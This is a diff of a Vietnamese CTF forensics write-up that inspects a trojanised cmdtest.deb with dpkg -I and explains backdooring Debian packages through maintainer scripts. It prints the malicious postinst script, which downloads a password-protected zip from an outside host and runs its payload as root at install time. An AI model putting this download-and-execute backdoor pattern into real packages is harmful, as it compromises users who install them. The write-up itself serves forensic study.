@@ -60,12 +60,69 @@ Session completed.
 
 ```
 
-Cũng không có kết quả gì, lúc này thì em nhận được hint của anh mentor là thử sử dụng giá trị băm của file Packages tải về up lên Virustotal, sau khi em up lên virustotal thì em thấy ở bên dưới của nó có chứa 2 đoạn script
+Cũng không có kết quả gì, lúc này em lên mạng tìm hiểu thêm thì em biết được có 1 cách để xem được nội dung phần mô tả của 1 file `.deb` trước khi extracted nó ra trước. 
+```                                                                                                                                                                                  
+┌──(nhduydeptrai㉿tobi)-[~/Scarlet_CTF_2026/file pcap]
+└─$ dpkg -I cmdtest.deb                            
+ new Debian package, version 2.0.
+ size 479540 bytes: control archive=1724 bytes.
+     754 bytes,    19 lines      control
+    1825 bytes,    23 lines      md5sums
+     139 bytes,     3 lines   *  postinst             #!/bin/bash
+     362 bytes,    12 lines   *  prerm                #!/bin/sh
+ Package: cmdtest
+ Version: 0.33.14.gcdfe14e-5
+ Architecture: all
+ Maintainer: Debian Python Team <team+python@tracker.debian.org>
+ Installed-Size: 96
+ Depends: python3, python3-cliapp, python3-markdown, python3-ttystatus, python3:any
+ Provides: yarn
+ Section: devel
+ Priority: optional
+ Homepage: https://liw.fi/cmdtest/
+ Description: blackbox testing of Unix command line programs
+  cmdtest black box tests Unix command line tools. Roughly, it is given a
+  script, its input files, and its expected output files. cmdtest runs
+  the script, and checks the output is as expected.
+  .
+  cmdtest is aimed specifically at testing non-interactive Unix command
+  line programs, and tries to make that as easy as possible.
+  .
+  Also included is a "scenario testing" tool, yarn.
+                                                            
+```
 
-<img width="1681" height="605" alt="image" src="https://github.com/user-attachments/assets/58df788b-5178-4aad-a19f-602827aa9799" /> 
+Ở đây em thấy có 2 dòng lệnh `postinst  #!/bin/bash` và `prerm   #!/bin/sh`
 
 Em có tìm hiểu trên mạng thì hành động nhúng một đoạn bash script vào trong 1 file `.deb` gọi là kỹ thuật **Maintainer Scripts** trong cấu trúc gói tin *debian*, hành động mà attacker thực hiện chính là tạo **Backdooring Debian Packages** (tạo cửa sau cho 1 gói tin debian) bằng cách lạm dụng `postinst` script và `preinst`.
 Hệ thống quản lí gói tin `dpkg` cho phép người tạo gói tin có thể nhúng thêm vào đó những đoạn script trước quá trình cài đặt/gỡ bỏ gói tin đó. Trong đó 2 đoạn script được sử dụng trong bài là `postinst` script sẽ tự động chạy sau khi cài đặt gói tin. Và script `preinst` sẽ tự động chạy trước khi xóa gói tin.
+
+Em lên mạng tìm hiểu thêm thì mình có thể xem được nội dung của 2 đoạn script trong cấu trúc gói tin `debian`, chỉ cần thêm tên của loại script được nhúng trong file `.deb` vào phần sau câu lệnh xem mô tả của file `.deb` là được.
+```
+                                                                                                                                                                                    
+┌──(nhduydeptrai㉿tobi)-[~/Scarlet_CTF_2026/file pcap]
+└─$ dpkg -I cmdtest.deb postinst
+#!/bin/bash
+curl -s http://knowledge-universal/symbols.zip -o symbols.zip
+unzip -q -P very-normal-very-cool symbols.zip
+bash ./disk_cleanup
+```
+```
+(nhduydeptrai㉿tobi)-[~/Scarlet_CTF_2026/file pcap]
+└─$ dpkg -I cmdtest.deb prerm   
+#!/bin/sh
+set -e
+
+# Automatically added by dh_python3
+if command -v py3clean >/dev/null 2>&1; then
+        py3clean -p cmdtest 
+else
+        dpkg -L cmdtest | sed -En -e '/^(.*)\/(.+)\.py$/s,,rm "\1/__pycache__/\2".*,e'
+        find /usr/lib/python3/dist-packages/ -type d -name __pycache__ -empty -print0 | xargs --null --no-run-if-empty rmdir
+fi
+
+# End automatically added section
+```
 
   - Ở đây em sẽ giải thích 1 chút về lý do tại sao lại sử dụng script `postinst` ở đây để thực hiện tải về 1 file zip và giải nén và thực thi nó. Bởi vì khi người dùng thực hiện tải 1 gói tin `.deb` trong linux thì bắt buộc họ phải sử dụng lệnh `sudo` - `sudo dpkg -i` or `sudo apt install`, khi đang ở trong quyền `sudo` việc thực hiện tải xuống 1 file khác được nhúng bên trong sẽ không để lại thông báo hoặc bị từ chối bởi quyền.
 
